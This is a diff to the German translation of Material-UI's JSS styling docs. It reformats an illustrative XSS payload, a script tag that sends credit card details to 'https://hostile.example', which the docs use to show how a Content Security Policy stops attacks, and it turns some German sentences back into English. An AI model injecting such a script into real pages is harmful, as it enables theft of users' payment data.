@@ -83,9 +83,9 @@ Das innere Theme ** überschreibt** das äußere Theme. Sie können das äußere
 
 ## JSS-Plugins
 
-JSS nutzt Plugins um seinen Kern zu erweitern, sodass Sie die Funktionen, die Sie benötigen auswählen können. Sie bezahlen nur für den Leistungsaufwand, den Sie verwenden.
+JSS uses plugins to extend its core, allowing you to cherry-pick the features you need, and only pay the performance overhead for what you are using.
 
-Nicht alle Plugins sind standardmäßig in der Material-UI verfügbar. Folgende (die eine Teilmenge von [jss-preset-default](https://cssinjs.org/jss-preset-default/) sind) sind inklusive:
+Nicht alle Plugins sind standardmäßig in der Material-UI verfügbar. The following (which is a subset of [jss-preset-default](https://cssinjs.org/jss-preset-default/)) are included:
 
 - [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)
 - [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)
@@ -416,10 +416,11 @@ JSS verwendet Featureerkennung, um die korrekten Präfixe anzuwenden. [Seien Sie
 
 Grundsätzlich verringert CSP Cross-Site Scripting (XSS)-Angriffe, indem Entwickler die Quellen angeben, aus denen ihre Assets abgerufen werden. Diese Liste wird vom Server als Header zurückgegeben. Angenommen, Sie haben eine Website unter `https://example.com` gehostet. Der CSP-Header `default-src: 'self';` erlaubt alle Assets, die sich unter `https://example.com/*` befinden und blockt alle anderen. Wenn es auf Ihrer Website einen für XSS anfälligen Bereich gibt, in dem nicht eingegebene Benutzereingaben angezeigt werden, könnte ein Angreifer Folgendes eingeben:
 
-    <script>
-      sendCreditCardDetails('https://hostile.example');
-    </script>
-    
+```html
+<script>
+  sendCreditCardDetails('https://hostile.example');
+</script>
+```
 
 Diese Sicherheitsanfälligkeit ermöglicht es dem Angreifer, irgendetwas auszuführen. Mit einem sicheren CSP-Header lädt der Browser dieses Skript jedoch nicht.
 
